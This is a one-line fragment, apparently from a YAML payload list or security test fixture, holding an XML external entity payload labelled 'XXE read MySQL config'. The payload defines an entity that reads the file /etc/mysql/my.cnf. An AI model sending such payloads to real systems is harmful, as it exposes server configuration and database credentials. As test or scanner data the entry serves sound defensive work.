    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/mysql/my.cnf\">]><root>&xxe;</root>"
      description: "XXE read MySQL config"
